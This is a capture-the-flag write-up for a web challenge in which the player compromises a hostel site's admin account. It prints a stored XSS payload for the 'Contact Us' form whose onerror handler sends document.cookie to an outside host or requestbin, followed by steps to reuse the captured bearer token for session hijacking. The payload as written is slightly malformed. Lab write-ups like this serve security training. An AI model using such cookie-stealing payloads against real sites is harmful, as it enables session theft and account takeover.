#### NOTE: The challenge is a bit buggy and will produce the final flag some times, and in other times you will have to repeat the cookie manipulation part multiple times
# Booking
## Challenge Description:
On your last vacation day in the "Wild Moose Hostel", the hostel's manager heard you discussing your full-time job as a penetration tester with other guests.<br>
She offered you to stay an additional night, free of charge, in exchange for assistance regarding a suspicion they have based on a security issue.<br>
According to her, they noticed several logins to their admin accounts at late hours, which none of the actual admins could confirm as valid.<br>

#### Your goals<br>
☛ Find the vulnerable functionality on the web application.<br>
☛ Find a way to compromise an admin account.<br>
☛ Gain access to the hostel's admin panel.<br>


## Process:
Create an account. The credentials don't matter all that much, just remember them.<br>
After creating an account, sign in and go to 'My Moose'.<br>
Scroll down to the 'Contact Us' section.<br>
Go to this site in a different tab: https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md<br>
<br>
Copy the following snippet of code and paste it into the text box in the original site.
<imgsrc=xonerror=this.src='http://192.168.0.18:8888/?'+document.cookie;><br>

https://pipedream.com/requestbin<br>
Create a public bin and paste the link you got into the src of the code above<br>
Send the message and check for the token in the requested bin<br>
Go to https://jwt.io/ and translate the Bearer<br>
Use the 'cookie editor' extension or access the cookies though the 'Application' tab in the 'inspect' of the site.<br>
Paste the bearer value and save<br>
